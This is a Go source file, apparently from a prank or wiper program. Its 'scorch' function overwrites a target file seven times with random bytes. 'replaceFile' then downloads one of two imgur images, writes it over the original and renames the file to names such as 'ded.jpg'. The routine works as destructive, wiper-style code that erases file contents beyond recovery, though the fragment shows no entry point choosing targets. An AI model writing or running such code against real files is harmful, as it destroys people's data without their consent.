package main

import (
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

// List of image links, in order of name type, this will aid with renaming files
var PICLINKS = []string{
	"https://i.imgur.com/gxMI91T.jpg",
	"https://i.imgur.com/DdU55tp.jpg",
}

// List of new file names, correspond to image link
var PICNAMES = []string{
	"ded.jpg",
	"jack_jack.jpg",
}

// Create New File Location
// @return: new (absolute)
func newPath(old string, new string) string {
	path := filepath.Dir(old) + "\\" + new // construct the correct new filepath
	return path
}

// Change the name of a fully replaced file
func renameFile(old string, new string) {
	// Old Path
	oldLocation := old
	// New name for file
	newName := new
	// Fill out the filepath from existing path + new file name
	path := newPath(oldLocation, newName)
	// Rename File
	err := os.Rename(oldLocation, path)
	if err != nil {
		print("error in renaming")
		return
	} // if failed return
}

// Make a web request to get the image
func getImage(url string) *http.Response {
	image, e := http.Get(url) // get image from URL
	if e != nil {
		return nil
	} // if failed, return nil
	return image
}

// Scorch the original file
func scorch(path string) {
	info, err := os.Stat(path) // get length of file
	if err != nil {
		print("error retrieving file information (os.Stat)")
		return
	} // if not open, just return

	fileSize := info.Size() // get the length of the original file

	for i := 0; i < 7; i++ { // scorch the file 7 times
		replacement := make([]byte, fileSize)
		_, _ = rand.Read(replacement)
		_ = ioutil.WriteFile(path, replacement, 644) // overwrite file with random bytes
	}
}

// Replace the old file with the new image
func replaceFile(file string) {
	rand.Seed(time.Now().UnixNano())

	scorch(file)                              // thoroughly overwrite file
	replaceNumber := rand.Intn(len(PICLINKS)) // decide which image to replace file with

	pic := getImage(PICLINKS[replaceNumber]) // pic := the resource at the given url
	body, _ := ioutil.ReadAll(pic.Body)      // body := the data read from pic

	_ = ioutil.WriteFile(file, body, 644)     // write image on old file location
	renameFile(file, PICNAMES[replaceNumber]) // renames the file
}
